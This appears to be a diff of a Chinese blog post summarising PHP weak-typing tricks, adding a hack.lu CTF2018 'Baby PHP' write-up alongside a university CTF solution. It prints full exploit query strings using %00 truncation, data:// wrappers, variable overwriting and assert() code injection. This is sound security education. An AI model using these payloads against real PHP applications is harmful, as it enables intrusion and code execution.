@@ -79,19 +79,20 @@
 
 
 
-<meta name="description" content="直接看一道题目，是在最近新疆大学办的一个CTF上看到的description:  小明shell下的编辑器用的比较6  index.php.swo泄露了源码">
+<meta name="description" content="新疆大学校赛description:  小明shell下的编辑器用的比较6  index.php.swo泄露了源码">
 <meta name="keywords" content="CTF,PHP,弱类型">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP弱类型的一些总结">
 <meta property="og:url" content="http://yoursite.com/2018/09/20/PHP弱类型的一些总结/index.html">
 <meta property="og:site_name" content="C0mRaDe&#39;s Blog">
-<meta property="og:description" content="直接看一道题目，是在最近新疆大学办的一个CTF上看到的description:  小明shell下的编辑器用的比较6  index.php.swo泄露了源码">
+<meta property="og:description" content="新疆大学校赛description:  小明shell下的编辑器用的比较6  index.php.swo泄露了源码">
 <meta property="og:locale" content="zh-hk">
 <meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1537437136389.png">
-<meta property="og:updated_time" content="2018-09-20T10:07:05.073Z">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1540198724706.png">
+<meta property="og:updated_time" content="2018-10-22T09:04:26.101Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PHP弱类型的一些总结">
-<meta name="twitter:description" content="直接看一道题目，是在最近新疆大学办的一个CTF上看到的description:  小明shell下的编辑器用的比较6  index.php.swo泄露了源码">
+<meta name="twitter:description" content="新疆大学校赛description:  小明shell下的编辑器用的比较6  index.php.swo泄露了源码">
 <meta name="twitter:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1537437136389.png">
 
 
@@ -324,7 +325,7 @@
       
 
       
-        <p>直接看一道题目，是在最近新疆大学办的一个CTF上看到的<br>description:</p>
+        <h1 id="新疆大学校赛"><a href="#新疆大学校赛" class="headerlink" title="新疆大学校赛"></a>新疆大学校赛</h1><p>description:</p>
 <blockquote>
 <p>小明shell下的编辑器用的比较6</p>
 </blockquote>
@@ -333,9 +334,9 @@
 <ul>
 <li><code>ctf=!#?&amp;@</code>是肯定要有的</li>
 <li><code>password</code>必须符合<code>^[a-zA-Z0-9]+$</code>，但是后面又要求它有<code>--</code></li>
-<li>传进去的<code>xjnu</code>是个数组，而且<code>xjnu[bar1]</code>不能是数字，<code>xjnu[bar2]</code>是个数组，有3个元素，而且<code>xjnu[bar2][0]</code>是个数组。<code>xjnu[bar2]</code>中的value会先进行<code>preg_match(&#39;/2018/&#39;, $val)</code>，再与2018比较，相等的话则get flag.</li>
+<li>传进去的<code>xjnu</code>是个数组，而且<code>xjnu[bar1]</code>不能是数字，<code>xjnu[bar2]</code>是个数组，有3个元素，而且<code>xjnu[bar2][0]</code>是个数组。<code>xjnu[bar2]</code>中的value会先进行<code>preg_match(&#39;/2018/&#39;, $val)</code>，再与2018比较，相等的话则get flag.<br>先说一点弱类型的前置知识：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;admin&quot;==0);  //true</span><br><span class="line">var_dump(&quot;1admin&quot;==1); //true</span><br><span class="line">var_dump(&quot;admin1&quot;==1) //false</span><br><span class="line">var_dump(&quot;admin1&quot;==0) //true</span><br><span class="line">var_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); //true </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
-<p>先说一点弱类型的前置知识：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">"admin"</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"1admin"</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span>==<span class="number">1</span>) <span class="comment">//false</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span>==<span class="number">0</span>) <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"0e123456"</span>==<span class="string">"0e4456789"</span>); <span class="comment">//true </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>当一个字符串被当作一个数值来取值，其结果和类型如下:<br>如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内，该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开<br>始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
 </blockquote>
@@ -344,9 +345,15 @@
 <li>对于<code>password</code>，它使用了<code>ereg</code>函数去判断，这个函数存在<code>%00</code>截断漏洞，我们可以构造<code>password=asd%00--</code>来绕过</li>
 <li>对于<code>xjnu[bar1]</code>，题目这里仅仅限制了它不能是数字，后面的与2016的比较显得有点多余，不影响结果。这里假设如果<code>xjnu[bar1]&gt;2016</code>不成立，程序就会退出，我们可以构造<code>xjnu[bar1]=12345as</code>，在与数字进行比较时，它会被转换成<code>12345</code>，自然就比2016要大了</li>
 <li>对于<code>xjnu[bar2]</code>，要求它是数组，我们可以用<code>xjnu[bar2][]=..</code>的形式来对它的元素进行赋值，还要求<code>xjnu[bar2][0]</code>也是数组，同样可以用<code>xjnu[bar2][0][]</code>的方法来进行赋值。这里要注意的是，由于<code>foreach</code>从第一个元素开始，而<code>preg_match</code>的参数不能是数组，不然程序就会发生致命错误，所以要把<code>xjnu[bar][0]</code>放到后面去。另外，这里不要想去传入布尔型的True，直接传过去只能被当作字符串，只有json才能传布尔型数据。</li>
-<li>最后还有一个弱类型比较，要求<code>$val</code>中不能有2018，然后，<code>$val==2018</code>必须为True，这里可以使用进制绕过，2018的十六进制是<code>0x7e2</code>，在进行数值比较时，它会被当作float来取值。</li>
+<li>最后还有一个弱类型比较，要求<code>$val</code>中不能有2018，然后，<code>$val==2018</code>必须为True，这里可以使用进制绕过，2018的十六进制是<code>0x7e2</code>，在进行数值比较时，它会被当作float来取值。<br>因此，最后构造的payload是这样的：<code>ctf=!%23%3f%26%40&amp;password=xz%00--&amp;xjnu[bar1]=65535zz&amp;xjnu[bar2][1]=0x7e2&amp;xjnu[bar2][2]=3&amp;xjnu[bar2][0][]=zxcs</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1537437136389.png" alt="enter description here"><h1 id="hack-lu-CTF2018-Baby-PHP"><a href="#hack-lu-CTF2018-Baby-PHP" class="headerlink" title="hack.lu CTF2018 Baby PHP"></a>hack.lu CTF2018 Baby PHP</h1></li>
 </ul>
-<p>因此，最后构造的payload是这样的：<code>ctf=!%23%3f%26%40&amp;password=xz%00--&amp;xjnu[bar1]=65535zz&amp;xjnu[bar2][1]=0x7e2&amp;xjnu[bar2][2]=3&amp;xjnu[bar2][0][]=zxcs</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1537437136389.png" alt="enter description here"></p>
+<blockquote>
+<p>Difficulty: baby<br>PHP is a popular general-purpose scripting language that is especially suited to web development.<br>Fast, flexible and pragmatic, PHP powers everything from your blog to the most popular websites in the world.<br>Can you untangle this mess?!</p>
+</blockquote>
+<p>这是一道源码审计题<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'msg'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$msg = $_GET[<span class="string">'msg'</span>];</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($msg)!==<span class="string">"Hello Challenge!"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Wow so rude!!!!1'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello Hacker! Have a look around.\n"</span>;</span><br><span class="line"></span><br><span class="line">@$k1=$_GET[<span class="string">'key1'</span>];</span><br><span class="line">@$k2=$_GET[<span class="string">'key2'</span>];</span><br><span class="line"></span><br><span class="line">$cc = <span class="number">1337</span>;$bb = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(intval($k1) !== $cc || $k1 === $cc)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lol no\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($k2) == $bb)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^\d+＄/'</span>, $k2) &amp;&amp; !is_numeric($k2))&#123;</span><br><span class="line">        <span class="keyword">if</span>($k2 == $cc)&#123;</span><br><span class="line">            @$cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>($k1,$k2) = [$k2, $k1];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(substr($cc, $bb) === sha1($cc))&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $lel =&gt; $hack)&#123;</span><br><span class="line">        $$lel = $hack;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$‮b = <span class="string">"2"</span>;$a=<span class="string">"‮b"</span>;<span class="comment">//;1=b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($$a !== $k1)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lel no\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// plz die now</span></span><br><span class="line">assert_options(ASSERT_BAIL, <span class="number">1</span>);</span><br><span class="line">assert(<span class="string">"$bb == $cc"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>这里有以下这几个点需要去绕过：<br>1.<code>file_get_contents($msg)==&#39;Hello Challenge!&#39;</code>，<code>php://input</code>或者是<code>data://text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ==</code><br>2.<code>intval($k1) !== $cc || $k1 === $cc</code>，这里用<code>key1=1337a</code>可以绕过<br>3.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(strlen($k2) == $bb)&#123;</span><br><span class="line">    if(preg_match(&apos;/^\d+＄/&apos;, $k2) &amp;&amp; !is_numeric($k2))&#123;</span><br><span class="line">        if($k2 == $cc)&#123;</span><br><span class="line">            @$cc = $_GET[&apos;cc&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里要注意几个点，首先，<code>$k2</code>的长度要和<code>$bb</code>一样，也就是42，然后，要匹配<code>&#39;/^\d+＄/&#39;</code>这个正则，而且不能是数字类型，最后还要<code>==1337</code>。这里要注意的是，正则中的<code>＄</code>并不是字符串结束符<code>$</code>，所以只需要在一连串数字最后加一个<code>＄</code>，而且，这个字符占两个字节，所以在它之前的数字个数只要40个就足够了，再加上要和1337相等，所以此处构造的<code>key2=0000000000000000000000000000000000001337＄</code>.<br>4.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr($cc, $bb) === sha1($cc))&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $lel =&gt; $hack)&#123;</span><br><span class="line">        $$lel = $hack;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这部分首先是有一个奇怪的比较，然后就可以进行变量覆盖。这里可以构造<code>cc[]=1</code>来实现绕过，<code>substr</code>和<code>sha1</code>和<code>md5</code>处理数组都是返回<code>NULL</code>。然后进行变量覆盖，先看后面的代码。<br>5.<code>$b=1</code>那一行有一些奇怪的不可见字符在里面，复制到sublime里面可以还原<img src="https://www.github.com/coomrade/Img/raw/master/pics/1540198724706.png" alt="enter description here">经过这一步，再看下面的代码,<code>if($$a!==$k1)</code>，此时<code>$a=b</code>,<code>$$a=$b=2</code>，因此我们需要构造<code>$k1=2</code>，用上面的变量覆盖点来覆盖就可以，<code>k1=2</code>。<br>6.最后就到了assert的地方，随便传入<code>bb=命令 ;//</code>即可。<br>最终payload:<code>http://localhost/babyphp.php?msg=data://text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ==&amp;key1=1337a&amp;key2=000000000000000000000000000000000001337%EF%BC%84&amp;cc[]=1&amp;k1=2&amp;bb=phpinfo();//</code></p>
 
       
     </div>
@@ -445,8 +452,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -510,6 +526,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#新疆大学校赛"><span class="nav-number">1.</span> <span class="nav-text">新疆大学校赛</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hack-lu-CTF2018-Baby-PHP"><span class="nav-number">2.</span> <span class="nav-text">hack.lu CTF2018 Baby PHP</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
